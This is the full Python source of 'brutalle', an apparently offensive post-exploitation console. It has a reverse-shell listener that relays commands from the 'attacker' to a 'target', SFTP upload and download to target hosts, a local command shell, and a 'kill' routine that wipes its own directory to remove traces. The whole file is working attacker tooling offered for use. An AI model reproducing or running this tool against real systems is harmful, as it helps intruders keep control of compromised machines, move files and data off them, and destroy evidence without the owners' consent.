#!/bin/python3

import sys
import subprocess
import os
import socket
import threading
import paramiko
import getpass
import platform
from datetime import datetime
import shutil
try:
    import readline
except ImportError:
    import pyreadline as readline

isHome = True

mydir = os.getcwd()

log_file = os.path.join(mydir, 'brutalle.log')
historyFile = os.path.join(mydir, '.brutalle.hist')

def log_activity(action, status="Info"):
    """
    Logs an action with a timestamp and status to the log file.

    Args:
        action (str): Description of the action being logged.
        status (str): The status level of the log entry (default is "Info").

    Returns:
        None
    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {status}: {action}\n"
    try:
        with open(log_file, "a") as log:
            log.write(log_entry)
    except Exception as e:
        print(f"Logging error: {e}")

if os.path.exists(historyFile):
    readline.read_history_file(historyFile)

def save_history():
    try:
        readline.write_history_file(historyFile)
        log_activity("Command history saved", "Success")
    except Exception as e:
        print(f"Error saving history: {e}")
        log_activity(f"Error saving history: {e}", "Error")

def completer(text, state):
    """
    Provides tab completion options based on the current command context.

    Args:
        text (str): The current text typed by the user to match commands.
        state (int): The index of the matched option to return, allowing iteration through options.

    Returns:
        str or None: The matched completion option if available, otherwise None.
    """
    commands = ['shell', 'reverse', 'put', 'get', 'exit', 'help']
    options = [cmd for cmd in commands if cmd.startswith(text)] if isHome else [cmd for cmd in os.listdir('.') if cmd.startswith(text)]
    return options[state] if state < len(options) else None

readline.set_completer(completer)
readline.parse_and_bind("tab: complete")

def change_directory(cmd):
    """
    Changes the current working directory based on a command input.

    Args:
        cmd (str): The command string containing the 'cd' directive followed by the path.

    Returns:
        None
    """
    try:
        upath = cmd[3:].strip()
        fpath = os.path.expanduser(upath)
        os.chdir(fpath)
        sys.stdout.write(f"Changed directory to {os.getcwd()}\n")
        log_activity(f"Changed directory to {os.getcwd()}", "Success")
    except FileNotFoundError:
        error_msg = f"{fpath}: No such file or directory"
        sys.stdout.write(error_msg + "\n")
        log_activity(error_msg, "Error")
    except NotADirectoryError:
        error_msg = f"{fpath}: Not a directory"
        sys.stdout.write(error_msg + "\n")
        log_activity(error_msg, "Error")
    except PermissionError:
        error_msg = f"{fpath}: Permission denied"
        sys.stdout.write(error_msg + "\n")
        log_activity(error_msg, "Error")
    except Exception as e:
        error_msg = f"An error occurred: {e}"
        sys.stdout.write(error_msg + "\n")
        log_activity(error_msg, "Error")

def execute_command(cmd):
    """
    Executes a shell command, handling 'clear' commands for cross-platform compatibility.

    Args:
        cmd (str): The command to be executed.

    Returns:
        None
    """
    if cmd.lower() in ["clear", "cls"]:
        clear_cmd = "cls" if platform.system() == "Windows" else "clear"
        subprocess.run(clear_cmd, shell=True)
        log_activity("Screen cleared", "Success")
    else:
        try:
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.stdout:
                sys.stdout.write(result.stdout.decode())
            if result.stderr:
                sys.stderr.write(result.stderr.decode())
            log_activity(f"Executed command: {cmd}", "Success")
        except FileNotFoundError:
            error_msg = f"{cmd}: command not found"
            sys.stdout.write(error_msg + "\n")
            log_activity(error_msg, "Error")
        except Exception as e:
            error_msg = f"Unknown error during command execution: {e}"
            sys.stdout.write(error_msg + "\n")
            log_activity(error_msg, "Error")

def shell_mode():
    """
    Activates an interactive shell mode for command input, handling directory changes,
    executing commands, and logging activity.

    Returns:
        None
    """
    global isHome
    print("\nEntering shell mode...\n")
    log_activity("Entered shell mode")
    isHome = False
    while True:
        try:
            cmd = input("$ ").strip()
            if cmd.lower() == "exit":
                log_activity("Exited shell mode")
                break
            elif cmd.lower().startswith("cd "):
                change_directory(cmd)
            else:
                execute_command(cmd)
        except KeyboardInterrupt:
            sys.stdout.write("\nUse 'exit' to quit.\n")
            log_activity("KeyboardInterrupt in shell mode", "Warning")
    print("\nExiting shell mode...\n")
    isHome = True

def handle_input(client_socket):
    """
    Reads input from the attacker's terminal and sends it to the target.

    Parameters:
        client_socket (socket): The socket object representing the connection to the target.
    
    Returns:
        None
    """
    try:
        while True:
            cmd = sys.stdin.read(1)
            if not cmd:
                break
            client_socket.send(cmd.encode())
    except Exception as e:
        error_msg = f"Input handling error: {e}"
        sys.stderr.write(error_msg + "\n")
        log_activity(error_msg, "Error")

def reverse_listener(port):
    """
    Initializes a reverse shell listener on the specified port, accepts incoming connections,
    and handles bidirectional communication with the client.

    Parameters:
        port (int): The port number to listen on.

    Returns:
        None
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.bind(("0.0.0.0", int(port)))
        server_socket.listen(5)
        print(f"Listening on port {port}\n")
        log_activity(f"Started listener on port {port}", "Success")
        
        # Setting server socket timeout to periodically check for KeyboardInterrupt on Windows
        server_socket.settimeout(1.0)

        try:
            while True:
                try:
                    client_socket, client_address = server_socket.accept()
                    print(f"Connection received from {client_address}")
                    log_activity(f"Connection received from {client_address}", "Success")

                    input_thread = threading.Thread(target=handle_input, args=(client_socket,))
                    input_thread.daemon = True
                    input_thread.start()

                    while True:
                        output = client_socket.recv(4096).decode()
                        if not output:
                            break
                        sys.stdout.write(output)
                        sys.stdout.flush()
                    client_socket.close()
                    break  # Exit after client disconnects
                except socket.timeout:
                    continue  # Continue listening after timeout

        except KeyboardInterrupt:
            print("\nListener interrupted. Closing listener.")
            log_activity("Listener interrupted by user", "Warning")

    except Exception as e:
        error_msg = f"Error in listener: {e}"
        sys.stderr.write(error_msg + "\n")
        log_activity(error_msg, "Error")
    finally:
        if 'client_socket' in locals():
            client_socket.close()
        server_socket.close()

def ssh_transfer(target, username, password, action):
    """
    Establishes an SSH connection to a remote target and performs file transfer actions.

    Parameters:
        target (str): The hostname or IP address of the SSH target.
        username (str): The SSH username for authentication.
        password (str): The SSH password for authentication.
        action (str): Specifies the transfer action, either 'put' to upload or 'get' to download a file.

    Returns:
        None
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, username=username, password=password)
        print("Connection successful!")
        log_activity(f"Connected to {target} via SSH as {username}", "Success")

        sftp = ssh.open_sftp()
        localPath = input("Enter local file path with file name: ")
        remotePath = input("Enter remote file path with file name: ")

        if action == 'put':
            sftp.put(localPath, remotePath)
            print(f"{localPath} uploaded successfully to {target} at {remotePath}")
            log_activity(f"File uploaded via SSH from {localPath} to {remotePath}", "Success")
        elif action == 'get':
            sftp.get(remotePath, localPath)
            print(f"{target}:{remotePath} downloaded successfully to {localPath}")
            log_activity(f"File downloaded via SSH from {remotePath} to {localPath}", "Success")
    except Exception as e:
        error_msg = f"SSH transfer error: {e}"
        print(error_msg)
        log_activity(error_msg, "Error")
    finally:
        print("Closing connection")
        sftp.close()
        ssh.close()

def self_destruct():
    mydir = os.getcwd()
    confirmation = input("WARNING: This action will delete the current script, logs, history, and all files in this directory. Type 'YES' to confirm: ")
    if confirmation.strip().upper() != "YES":
        print("Self-destruction canceled.")
        return

    try:
        if platform.system() == "Windows":
            # On Windows, delete all files and folders individually in the directory
            for root, dirs, files in os.walk(mydir, topdown=False):
                for file in files:
                    os.remove(os.path.join(root, file))
                for dir in dirs:
                    shutil.rmtree(os.path.join(root, dir))
            print("All files and folders within the directory have been deleted on Windows.")
        else:
            # On Linux, delete the directory and all contents
            shutil.rmtree(mydir)
            print("Self-destruction completed. All files in the directory have been deleted.")
        
    except Exception as e:
        print(f"Failed to delete the tool: {e}")
        log_activity(f"Failed to execute self-destruction: {e}", "Error")
    finally:
        sys.exit(0)

def main():
    """
    Main loop for handling user input and executing commands in the shell.

    This function continuously prompts the user for commands, including starting 
    a shell mode, initiating a reverse listener, transferring files via SSH, and 
    initiating the self-destruct mechanism. Supports error handling and logging.
    
    Returns:
        None
    """
    reserved = {
        'help': 'Displays a list of available commands',
        'shell': 'Enter interactive shell mode',
        'reverse': 'Start a reverse shell listener',
        'put': 'Upload a file via SSH',
        'get': 'Download a file via SSH',
        'exit': 'Exit the program',
        'kill': 'initiate self destruct mechanism'
    }

    banner = '''
    
▄▄▄▄· ▄▄▄  ▄• ▄▌▄▄▄▄▄ ▄▄▄· ▄▄▌  ▄▄▌  ▄▄▄ .
▐█ ▀█▪▀▄ █·█▪██▌•██  ▐█ ▀█ ██•  ██•  ▀▄.▀·
▐█▀▀█▄▐▀▀▄ █▌▐█▌ ▐█.▪▄█▀▀█ ██▪  ██▪  ▐▀▀▪▄
██▄▪▐█▐█•█▌▐█▄█▌ ▐█▌·▐█ ▪▐▌▐█▌▐▌▐█▌▐▌▐█▄▄▌
·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀  ▀ .▀▀▀ .▀▀▀  ▀▀▀ 

            type 'help' to view list of commands
    '''
    print(banner)

    while True:
        try:
            cmd = input("💀  ").strip()
            if cmd.lower() == "exit":
                print("bye!")
                save_history()
                log_activity("Shell exited", "Success")
                sys.exit(0)
            elif cmd.lower() == "shell":
                shell_mode()
            elif cmd.lower().startswith("reverse"):
                port = cmd.split()[1] if len(cmd.split()) > 1 else None
                if port and port.isdigit():
                    reverse_listener(int(port))
                else:
                    print("Usage: reverse <port>\n")
                    log_activity("Invalid port for reverse listener", "Error")
            elif cmd.lower().startswith("put"):
                parts = cmd.split()
                if len(parts) == 3:
                    target, uname = parts[1], parts[2]
                    passwd = getpass.getpass("Enter password: ")
                    ssh_transfer(target, uname, passwd, "put")
                else:
                    print("Usage: put <target> <username>\n")
            elif cmd.lower().startswith("get"):
                parts = cmd.split()
                if len(parts) == 3:
                    target, uname = parts[1], parts[2]
                    passwd = getpass.getpass("Enter password: ")
                    ssh_transfer(target, uname, passwd, "get")
                else:
                    print("Usage: get <target> <username>\n")
            elif cmd.lower() == "help":
                print()
                for k, v in reserved.items():
                    print(f"{k}: {v}")
                log_activity("Displayed help menu")
                print()
            elif cmd.lower() == "kill":
                self_destruct()
                log_activity("Executed self destruct mechanism")    
            else:
                print(f"{cmd}: command not found.\nType 'help' for available commands.\n")
                log_activity(f"Unknown command: {cmd}", "Error")
        except KeyboardInterrupt:
            print("\nUse 'exit' to quit.")
            log_activity("Shell interrupted by user", "Warning")

if __name__ == "__main__":
    main()
